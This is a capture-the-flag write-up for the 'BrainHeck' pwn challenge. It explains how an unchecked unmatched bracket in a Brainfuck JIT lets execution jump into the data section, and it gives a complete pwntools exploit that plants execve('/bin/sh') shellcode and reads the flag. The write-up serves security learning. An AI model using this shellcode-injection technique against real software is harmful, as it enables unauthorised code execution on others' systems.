https://ctftime.org/event/2234/

# BrainHeck ~ PWN

Ok, jumps are quite useful sometimes, you can have them I guess

nc 129.151.142.36 36391

https://dl.1753ctf.com/brain-heck?s=HIXZfF4i

## Solution

This task is based on the task `BrainFrick` from the same CTF.

The main differences between this task and `BrainFrick` are as follows:

- We have access to the `[` and `]` symbols
- `+` and `-` are now constrained to the data section
    - `inc r14; and r14, $data-size`
    - This prevents us from replacing the bytes of compiled_end
        - We'll need to jump over this instead
- The pivot code writes over the value in `rsp`
    - Note you can probably restore the stack for use with a more conventional shellcode but missed this

In order to exploit this program we will:

- Use an unmatched `[` to jump into the data section
    - This lets us escape the code section and execute code in the data section
- Create an instance of "/bin/sh" in the data section for us to use
- Use the data section base pointer in `r15` in order to have a pointer to "/bin/sh" for `execve`

```
from pwn import *

REMOTE_IP = "129.151.142.36"
REMOTE_PORT = 36391

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Enter your code:\n")

# first write "/bin/sh" to the start of the data section
shellcode = b"/bin/sh\x00"

# next write the opcode sequence for "]" copied directly from instructions.cpp
shellcode += b"\x43\x80\x3c\x3e\x00\x74\x32\x48\x8d\x3d\x00\x00\x00\x00\x48\x29\xe7\x48\xc7\xc1\x01\x00\x00\x00\x4c\x89\xe8\x4c\x89\xe3\x48\xff\xcf\x38\x07\x75\x03\x48\xff\xc9\x38\x1f\x75\x03\x48\xff\xc1\x48\x85\xc9\x75\xea\x4c\x01\xd7\xff\xe7"

# r15 contains a pointer to the start of the data section which contains "/bin/sh"
# mov rdi, r15
# xor esi, esi
# xor edx, edx
# mov al, 0x3b
# syscall       ; execve("/bin/sh", 0, 0)
shellcode += b"\x4c\x89\xff\x31\xf6\x31\xd2\xb0\x3b\x0f\x05"

payload = b""
for b in shellcode:
    payload += b"+" * int(b)
    payload += b".>"

# increment data pointer to ensure its value is zero
payload += b">"

# this opening brace will skip over compiled_end and our "/bin/sh" to the "]" opcodes we placed in the data section
payload += b"["

p.sendline(payload)

p.clean()

p.sendline(b"/bin/cat /flag")

p.interactive()
```

## Flag
`1753c{jump_balance_not_checked_brain_is_a_heck}`
